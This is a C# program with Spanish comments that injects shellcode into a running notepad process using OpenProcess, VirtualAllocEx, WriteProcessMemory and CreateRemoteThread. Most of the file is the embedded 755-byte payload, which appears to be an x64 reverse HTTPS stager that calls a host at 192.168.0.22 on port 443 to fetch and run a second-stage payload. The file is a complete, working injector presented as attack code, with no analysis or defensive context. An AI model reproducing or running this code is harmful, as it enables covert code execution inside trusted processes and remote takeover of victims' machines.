using System;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace processinyeccions
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId
       );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
           IntPtr hProcess,
           IntPtr lpAddress,
           uint dwSize,
           AllocationType flAllocationType,
           MemoryProtection flProtect);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
              IntPtr hProcess,
              IntPtr lpBaseAddress,
              byte[] lpBuffer,
              Int32 nSize,
              out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out IntPtr lpThreadId);

// este es el shell code que se inyectara 
        static void Main(string[] args)
        {
            byte[] buf = new byte[755] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,
0x40,0x20,0x50,0x8b,0x48,0x18,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,
0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,
0x41,0x58,0x48,0x01,0xd0,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x0d,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e,
0x32,0x32,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,0x4d,
0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,
0x00,0x00,0xff,0xd5,0xe8,0xcb,0x00,0x00,0x00,0x2f,0x46,0x57,0x78,0x76,0x78,
0x30,0x37,0x76,0x52,0x74,0x6f,0x48,0x61,0x41,0x5a,0x71,0x5a,0x6d,0x63,0x51,
0x63,0x51,0x6d,0x39,0x4b,0x66,0x68,0x45,0x5a,0x66,0x49,0x4c,0x44,0x36,0x6c,
0x5f,0x66,0x43,0x2d,0x59,0x31,0x51,0x76,0x44,0x48,0x6f,0x6e,0x54,0x30,0x55,
0x33,0x57,0x53,0x48,0x75,0x72,0x33,0x5a,0x49,0x72,0x48,0x56,0x34,0x32,0x44,
0x4a,0x75,0x70,0x35,0x51,0x70,0x68,0x43,0x5a,0x72,0x37,0x55,0x70,0x38,0x55,
0x38,0x31,0x37,0x46,0x43,0x31,0x53,0x42,0x56,0x55,0x63,0x76,0x54,0x58,0x45,
0x65,0x4e,0x32,0x73,0x31,0x34,0x47,0x2d,0x69,0x34,0x50,0x4c,0x65,0x4d,0x59,
0x69,0x51,0x78,0x6d,0x6a,0x68,0x4c,0x4d,0x53,0x6c,0x31,0x42,0x57,0x38,0x74,
0x32,0x72,0x45,0x5f,0x5a,0x44,0x46,0x46,0x51,0x56,0x4e,0x51,0x49,0x41,0x42,
0x74,0x49,0x44,0x45,0x6d,0x45,0x30,0x4a,0x33,0x4b,0x4b,0x4c,0x68,0x4e,0x7a,
0x63,0x35,0x44,0x54,0x2d,0x37,0x43,0x6b,0x39,0x72,0x58,0x6c,0x4e,0x32,0x61,
0x63,0x36,0x37,0x4f,0x4f,0x50,0x75,0x72,0x56,0x43,0x64,0x6f,0x46,0x55,0x4a,
0x70,0x71,0x36,0x53,0x76,0x7a,0x76,0x4b,0x2d,0x77,0x64,0x4e,0x55,0x5f,0x68,
0x33,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,
0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,
0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,
0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,
0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,
0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,
0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,
0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,
0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,
0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,
0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,
0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,
0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,
0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,
0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,
0xb5,0xa2,0x56,0xff,0xd5 };

            // Guardar el valor del ID del processo a injectar 
            int targetProcessId = Process.GetProcessesByName("notepad")[0].Id;

            // Obtener el handler de un proceso 
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);

            // Crear un espacio en la memoria para guardar el shellcode en el proceso selecionado
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);


            IntPtr outSize = IntPtr.Zero;

            // Copiar el Shellcode al espacio de memoria creado
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr Novalue;
            // Crear un thread (hilo) en ese proceso que ejecute el shellcode 
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out Novalue);

        }
    }
}